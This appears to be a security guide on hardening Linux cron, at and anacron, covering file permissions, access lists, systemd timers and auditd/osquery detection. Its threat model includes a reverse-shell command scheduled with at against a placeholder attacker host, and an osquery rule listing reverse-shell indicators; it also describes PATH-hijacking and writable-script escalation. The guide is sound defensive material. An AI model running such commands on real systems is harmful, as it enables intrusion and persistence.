---
title: "Linux Cron and at Job Security Hardening"
description: "Cron and at are persistent attack surfaces on every Linux system. Writable crontab files, PATH hijacking in root jobs, and world-writable scripts executed on a schedule are among the most reliable privilege escalation and persistence techniques in an attacker's playbook. This guide covers file permission hardening, access control, root job hygiene, auditd monitoring, and when to replace cron entirely with systemd timers."
slug: linux-cron-at-security
date: 2026-05-07
lastmod: 2026-05-07
category: linux
tags:
  - cron
  - scheduled-tasks
  - privilege-escalation
  - file-permissions
  - persistence
personas:
  - security-engineer
  - sysadmin
article_number: 477
difficulty: Intermediate
estimated_reading_time: 11
published: true
layout: article.njk
permalink: /articles/linux/linux-cron-at-security/
---

# Linux Cron and at Job Security Hardening

## The Problem

Cron is installed and running on almost every Linux host. It runs jobs as root by default, operates silently in the background, and on most systems has received no security attention since the OS was provisioned. That combination makes it one of the most reliable persistence and privilege escalation vectors in post-exploitation tool kits.

The common failure modes are not exotic:

- **World-writable scripts called by root cron.** A root crontab entry runs `/opt/scripts/backup.sh`. That script is owned by a service account with `chmod 777`. Any local user rewrites the script; root executes it on the next cron tick.
- **Writable crontab files.** `/etc/cron.d/app-jobs` is owned by an application user. The user adds a root job to the file. cron runs it.
- **PATH hijacking.** A root cron job calls `tar`, `python3`, or `kubectl` by bare name. The crontab `PATH` includes a directory the attacker can write to. A fake binary in that directory runs as root.
- **Persistence via user crontabs.** An attacker with a low-privilege shell adds a reverse shell to their user crontab in `/var/spool/cron/crontabs/`. The entry survives reboots and is invisible to most monitoring.
- **`at` as a one-shot persistence mechanism.** `at` jobs are less scrutinised than cron jobs. On systems where `at` is installed but not controlled, any local user can schedule arbitrary command execution.

**Target systems:** Ubuntu 22.04+, Debian 12+, RHEL 9+, any Linux with vixie-cron, cronie, or dcron.

## Threat Model

- **Adversary 1 — Privilege escalation via world-writable cron script:** An attacker with a low-privilege shell discovers a root cron job that executes a script any user can write to. They replace the script with a command that adds their account to `/etc/sudoers`. Root runs the script on the next cron tick.
- **Adversary 2 — PATH hijacking in root cron:** A root crontab uses `PATH=/usr/local/bin:/usr/bin:/bin` and calls a binary by short name. The attacker has write access to `/usr/local/bin` (via a misconfigured package install step). They drop a malicious binary with the same name; root executes it.
- **Adversary 3 — Persistence via user crontab:** An attacker who achieves code execution as a non-root user adds a cron job to their personal crontab. The job re-establishes a reverse shell every five minutes. The job survives reboots and process kills targeting the original shell session.
- **Adversary 4 — `at` job injection:** A developer account has no restrictions on `at`. The attacker uses `echo "bash -i >& /dev/tcp/attacker/4444 0>&1" | at now + 1 minute` to schedule a one-shot callback that will not appear in any crontab.
- **Adversary 5 — Cron file tampering by a privileged but non-root account:** An account with write access to `/etc/cron.d/` drops a new file with a root job. Without file integrity monitoring on cron directories, the addition is not detected.
- **Access level:** All adversaries start with a non-root shell.
- **Objective:** Escalate to root or establish persistent execution that survives reboots and process kills.

## Configuration

### Step 1: Audit Current Cron State

Before hardening, map the full attack surface.

```bash
# List all system-wide cron jobs.
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*

# List per-user crontabs.
for user in $(cut -d: -f1 /etc/passwd); do
  crontab -l -u "$user" 2>/dev/null && echo "--- $user ---"
done

# List scheduled at jobs (requires root to see all users).
atq

# Find all cron-related spool files.
ls -la /var/spool/cron/crontabs/ 2>/dev/null   # Debian/Ubuntu
ls -la /var/spool/cron/ 2>/dev/null             # RHEL/CentOS
```

### Step 2: Harden File Permissions on System Cron Files

The cron directories and configuration files must be owned by root and not writable by anyone else. Incorrect permissions on these files are the single most common cron-related vulnerability.

**Required permissions:**

| Path | Owner | Permissions | Notes |
|---|---|---|---|
| `/etc/crontab` | `root:root` | `0644` or `0600` | Master system crontab |
| `/etc/cron.d/` | `root:root` | `0755` | Directory |
| `/etc/cron.d/*` | `root:root` | `0644` | Individual job files |
| `/etc/cron.daily/` | `root:root` | `0755` | Directory |
| `/etc/cron.daily/*` | `root:root` | `0755` | Scripts must be executable but not world-writable |
| `/etc/cron.weekly/` | `root:root` | `0755` | Same as above |
| `/etc/cron.monthly/` | `root:root` | `0755` | Same as above |
| `/etc/cron.hourly/` | `root:root` | `0755` | Same as above |
| `/var/spool/cron/` | `root:root` | `0700` | Debian/Ubuntu user spool parent |
| `/var/spool/cron/crontabs/` | `root:crontab` | `1730` | Sticky bit, group-writable for crontab command |

Apply correct ownership and permissions:

```bash
# System cron files.
chown root:root /etc/crontab
chmod 0644 /etc/crontab

chown -R root:root /etc/cron.d /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.hourly
chmod 0755 /etc/cron.d /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.hourly

# Scripts inside cron.* directories: owned by root, not world-writable.
find /etc/cron.d /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.hourly \
  -type f -exec chown root:root {} \; -exec chmod o-w {} \;
```

**Find misconfigurations with `find`:**

```bash
# Find cron config files not owned by root.
find /etc/cron.d /etc/cron.daily /etc/cron.weekly /etc/cron.monthly \
  /etc/cron.hourly /etc/crontab \
  -not -user root -o -not -group root 2>/dev/null

# Find world-writable files in cron directories.
find /etc/cron.d /etc/cron.daily /etc/cron.weekly /etc/cron.monthly \
  /etc/cron.hourly -perm -o+w 2>/dev/null

# Find scripts called by root crontabs that are world-writable.
# First, extract script paths from all cron files.
grep -hE '^[^#]' /etc/crontab /etc/cron.d/* 2>/dev/null \
  | awk '{for(i=7;i<=NF;i++) if($i ~ /^\//){print $i; break}}' \
  | xargs -I{} find {} -maxdepth 0 -perm -o+w 2>/dev/null
```

### Step 3: Restrict User Access with cron.allow and cron.deny

The `cron.allow` and `cron.deny` files control which users may create personal cron jobs.

**Logic:**
- If `/etc/cron.allow` exists: only users listed in it may use crontab.
- If `/etc/cron.allow` does not exist but `/etc/cron.deny` exists: users listed in `cron.deny` are blocked; all others are permitted.
- If neither file exists: behaviour is implementation-defined. On most systems, all users are permitted.

The most restrictive approach is an explicit allowlist:

```bash
# Create cron.allow with only users that legitimately need personal cron jobs.
# In most hardened environments this list is empty or contains only named admin accounts.
cat > /etc/cron.allow << 'EOF'
root
deploy-user
EOF

chmod 0640 /etc/cron.allow
chown root:root /etc/cron.allow

# Create an empty cron.deny as belt-and-suspenders.
touch /etc/cron.deny
chmod 0640 /etc/cron.deny
chown root:root /etc/cron.deny
```

With `/etc/cron.allow` in place, any user not listed receives a `You are not allowed to use cron. Sorry.` error when attempting `crontab -e`.

### Step 4: Root Cron Job Hygiene

Root cron jobs require more care than user cron jobs because mistakes execute with full privileges.

**Use absolute paths everywhere.** Never rely on the cron `PATH` for root jobs. A cron job that calls `python3 /opt/scripts/backup.py` trusts the `PATH` to find `python3`. If an attacker can write to any directory in the `PATH`, they can intercept the call.

```cron
# /etc/crontab — bad: relies on PATH for script and interpreter.
PATH=/usr/local/bin:/usr/bin:/bin
0 2 * * * root cleanup.sh

# /etc/crontab — good: absolute path to both interpreter and script.
0 2 * * * root /usr/bin/python3 /opt/scripts/cleanup.py
```

**Set a safe PATH explicitly in each job or at the top of crontab:**

```cron
# Minimal PATH containing only standard system directories.
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# Each job uses an absolute path to its script.
0 2 * * * root /usr/bin/bash /opt/scripts/backup.sh
15 3 * * 0 root /usr/bin/python3 /opt/scripts/rotate-logs.py
```

**Set `umask` in cron scripts.** The default umask in cron shells is `022` on most distributions, but inherited umask values can vary. Files created by root cron jobs with a permissive umask can become attack surfaces.

```bash
#!/usr/bin/env bash
# /opt/scripts/backup.sh — always set umask explicitly.
set -euo pipefail
umask 0027      # Owner: rwx, group: r-x, other: ---

BACKUP_DIR="/var/backups/app"
mkdir -p "$BACKUP_DIR"
# ... rest of script
```

**Do not reference user-controlled directories.** Root cron jobs must not read from or execute scripts stored in home directories, `/tmp`, `/var/tmp`, or any path writable by non-root users.

```bash
# Bad: script is in a home directory.
0 3 * * * root /home/deploy/scripts/cleanup.sh

# Bad: temp file used as input.
0 3 * * * root /usr/bin/bash /tmp/generated-script.sh

# Good: script is in a root-owned directory.
0 3 * * * root /opt/scripts/cleanup.sh
```

**Avoid `sudo` inside cron jobs.** A root cron job should not call `sudo`; it is already running as root. Calling `sudo` inside a root script adds complexity and can open additional attack vectors depending on sudoers configuration.

### Step 5: Harden `at` and `batch`

`at` provides one-shot scheduled execution and `batch` queues jobs to run when system load drops. Both are attack vectors on systems where they are installed but not controlled.

**Restrict with at.allow and at.deny.** The same allow/deny logic as cron applies:

```bash
# Allowlist: only root may use at.
# If at is not needed by any user, put only root or leave the file empty.
cat > /etc/at.allow << 'EOF'
root
EOF

chmod 0640 /etc/at.allow
chown root:root /etc/at.allow

touch /etc/at.deny
chmod 0640 /etc/at.deny
chown root:root /etc/at.deny
```

**Disable `at` if it is not needed.** On servers where scheduled one-shot jobs are never required, remove or disable the `at` daemon entirely:

```bash
# Debian/Ubuntu: disable and remove.
systemctl stop atd
systemctl disable atd
apt-get remove --purge at

# RHEL/Rocky/AlmaLinux.
systemctl stop atd
systemctl disable atd
dnf remove at
```

If `at` must be retained for operational reasons, verify the `atd` socket and binary permissions:

```bash
ls -la /usr/bin/at /usr/bin/atq /usr/bin/atrm /usr/bin/batch
stat /var/spool/cron/atjobs 2>/dev/null || stat /var/spool/at 2>/dev/null
```

### Step 6: Anacron Security

Anacron is the mechanism that runs missed cron jobs after a system that was powered off comes back online. Its configuration file and spool directory carry the same risks as cron.

```bash
# /etc/anacrontab must be root-owned and not world-writable.
chown root:root /etc/anacrontab
chmod 0644 /etc/anacrontab

# Verify ownership.
ls -la /etc/anacrontab
```

**Key `/etc/anacrontab` hardening points:**

```cron
# /etc/anacrontab
# SHELL and PATH should be explicit and minimal.
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin

# NICE level: 19 (lowest priority) prevents anacron jobs from starving
# interactive processes. This is the default but worth verifying.
RANDOM_DELAY=45
START_HOURS_RANGE=3-22

# Avoid world-writable spool directories.
# The TMPDIR used by anacron should not be /tmp.
```

Check anacron spool directory permissions:

```bash
# The anacron timestamp spool directory.
ls -la /var/spool/anacron/
# Each file should be root:root 0600.
find /var/spool/anacron/ -not -user root -o -perm -o+w 2>/dev/null
```

### Step 7: Replace Root Cron Jobs with systemd Timers

systemd timers address several cron weaknesses structurally:

- **No PATH injection risk.** Timer units call `ExecStart` with an absolute path. There is no `PATH` variable to hijack.
- **No script-file permission complexity.** The unit file, not a shell script, defines what runs. You can set `User=`, `Group=`, `ReadWritePaths=`, and `ProtectSystem=` in the unit.
- **Logging to journald.** All output from timer-triggered services goes to the journal. `journalctl -u backup.service` shows every execution with timestamps, exit codes, and stdout/stderr.
- **`ConditionPathExists` guards.** A timer unit can be conditioned on file existence, preventing execution if a prerequisite is missing.

**Equivalent of a root cron job as a systemd timer:**

The cron job:
```cron
0 2 * * * root /opt/scripts/backup.sh
```

Becomes two unit files:

```ini
# /etc/systemd/system/backup.service
[Unit]
Description=Nightly backup
ConditionPathExists=/opt/scripts/backup.sh
After=network-online.target

[Service]
Type=oneshot
User=backup-user
Group=backup-group
ExecStart=/opt/scripts/backup.sh

# Filesystem hardening.
ProtectSystem=strict
ReadWritePaths=/var/backups
PrivateTmp=true
NoNewPrivileges=true
CapabilityBoundingSet=
UMask=0027
```

```ini
# /etc/systemd/system/backup.timer
[Unit]
Description=Run nightly backup at 02:00

[Timer]
OnCalendar=*-*-* 02:00:00
Persistent=true     # Run missed jobs after reboot — equivalent to anacron.
RandomizedDelaySec=300

[Install]
WantedBy=timers.target
```

```bash
# Enable and start the timer.
systemctl daemon-reload
systemctl enable --now backup.timer

# Verify.
systemctl list-timers backup.timer
journalctl -u backup.service --since "24 hours ago"
```

Running the job as a dedicated low-privilege user (`backup-user`) with `ProtectSystem=strict` and `NoNewPrivileges=true` eliminates the root execution risk entirely. Even if the script is compromised, the blast radius is constrained to `ReadWritePaths`.

### Step 8: Detect Malicious Cron Jobs with auditd

auditd can watch cron directories for writes, giving you a record of every file modification with the responsible process, user, and timestamp.

```bash
# /etc/audit/rules.d/cron-watch.rules
# Monitor all writes to cron directories and user spool.

-w /etc/crontab -p rwa -k cron_modification
-w /etc/cron.d -p rwa -k cron_modification
-w /etc/cron.daily -p rwa -k cron_modification
-w /etc/cron.weekly -p rwa -k cron_modification
-w /etc/cron.monthly -p rwa -k cron_modification
-w /etc/cron.hourly -p rwa -k cron_modification
-w /etc/anacrontab -p rwa -k cron_modification
-w /var/spool/cron -p rwa -k cron_modification
-w /var/spool/cron/crontabs -p rwa -k cron_modification
-w /etc/at.allow -p rwa -k at_modification
-w /etc/at.deny -p rwa -k at_modification
-w /var/spool/at -p rwa -k at_modification
```

Load rules and query for activity:

```bash
# Load the new rules.
augenrules --load

# Search for all cron modifications in the last 24 hours.
ausearch -k cron_modification --start today --interpret

# Watch for cron activity in real time.
auditctl -w /var/spool/cron/crontabs -p rwa -k live_cron_watch
tail -f /var/log/audit/audit.log | grep cron
```

**osquery for automated scanning:**

osquery can enumerate all active cron jobs across a fleet and alert on unexpected entries:

```sql
-- List all cron jobs visible to osquery.
SELECT command, path, minute, hour, day_of_month, month, day_of_week
FROM crontab;

-- Alert on cron entries that contain shell callbacks, base64, or wget/curl.
SELECT *
FROM crontab
WHERE command LIKE '%/dev/tcp%'
   OR command LIKE '%base64%'
   OR command LIKE '%wget%'
   OR command LIKE '%curl%http%'
   OR command LIKE '%nc %'
   OR command LIKE '%ncat%';
```

The osquery crontab table reads from `/etc/crontab`, `/etc/cron.d/*`, and all user spool files, giving a unified view without manually iterating directories.

### Step 9: Container and Kubernetes Context

Running cron inside containers is a common anti-pattern that reintroduces all of the problems described above while adding new ones.

**Why you should not run cron inside containers:**

- **No process supervision.** If crond exits in a container without an init process, nothing restarts it and the job scheduler silently disappears.
- **Image bloat.** Installing crond means installing a daemon, its libraries, and its attack surface in every image that uses it.
- **Log opacity.** cron writes to syslog or a file. Inside a container, log output needs to reach stdout/stderr to be collected by the container runtime. cron's logging model is not designed for this.
- **No audit trail.** The auditd rules above require the audit subsystem, which typically runs on the host, not inside a container.
- **Privilege escalation at container boundary.** If a cron script has a vulnerability and the container runs as root, a container escape could follow.

**Use Kubernetes CronJobs instead:**

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: nightly-backup
  namespace: ops
spec:
  schedule: "0 2 * * *"
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 3
  failedJobsHistoryLimit: 3
  jobTemplate:
    spec:
      template:
        spec:
          restartPolicy: OnFailure
          serviceAccountName: backup-sa     # Dedicated SA with minimal RBAC.
          securityContext:
            runAsNonRoot: true
            runAsUser: 10001
            seccompProfile:
              type: RuntimeDefault
          containers:
          - name: backup
            image: registry.example.com/tools/backup:1.4.2@sha256:...
            command: ["/usr/local/bin/backup.sh"]
            securityContext:
              allowPrivilegeEscalation: false
              readOnlyRootFilesystem: true
              capabilities:
                drop: ["ALL"]
            resources:
              limits:
                cpu: "500m"
                memory: "256Mi"
```

Kubernetes CronJobs provide audit events via the API server audit log, resource limits that prevent runaway jobs, pod security enforcement, and automatic history retention. The scheduler runs outside the workload, eliminating the single-process failure mode.

## Verification

After applying hardening, validate the configuration:

```bash
# Verify cron file permissions.
stat /etc/crontab
find /etc/cron.d /etc/cron.daily /etc/cron.weekly /etc/cron.monthly \
  /etc/cron.hourly -perm -o+w 2>/dev/null && echo "FAIL: world-writable cron files found" \
  || echo "PASS: no world-writable cron files"

# Verify cron.allow exists and is not empty (if access restriction is applied).
[[ -s /etc/cron.allow ]] && echo "PASS: cron.allow exists" || echo "WARN: cron.allow missing or empty"

# Verify at.allow.
[[ -s /etc/at.allow ]] && echo "PASS: at.allow exists" || echo "WARN: at.allow missing or empty"

# Verify atd is disabled (if at is not needed).
systemctl is-enabled atd 2>/dev/null && echo "WARN: atd is enabled" || echo "PASS: atd disabled"

# Verify auditd rules are loaded.
auditctl -l | grep cron

# List active systemd timers.
systemctl list-timers --all

# Check for unexpected crontab entries.
for user in $(cut -d: -f1 /etc/passwd); do
  jobs=$(crontab -l -u "$user" 2>/dev/null)
  [[ -n "$jobs" ]] && echo "=== $user ===" && echo "$jobs"
done
```

## Hardening Checklist

- [ ] All files in `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`, `/etc/cron.hourly/` are owned `root:root` and not world-writable
- [ ] `/etc/crontab` is `root:root 0644` or `0600`
- [ ] `/etc/cron.allow` exists with an explicit allowlist of users permitted to use cron
- [ ] All scripts called by root cron jobs use absolute paths for every binary invocation
- [ ] Root cron jobs do not reference paths in home directories, `/tmp`, or other user-writable locations
- [ ] Scripts called by root cron jobs set `umask 0027` or stricter
- [ ] `/etc/at.allow` restricts at access; or `atd` is disabled and removed if at is not needed
- [ ] `/etc/anacrontab` is `root:root 0644`; spool files in `/var/spool/anacron/` are `root:root 0600`
- [ ] auditd watches are active on all cron and at directories
- [ ] New scheduled workloads use systemd timers with `User=`, `ProtectSystem=`, and `NoNewPrivileges=` rather than root crontab entries
- [ ] No cron daemon is running inside containers; Kubernetes CronJobs are used for cluster-scoped scheduled work
- [ ] osquery or equivalent is configured to alert on cron job entries containing reverse-shell indicators
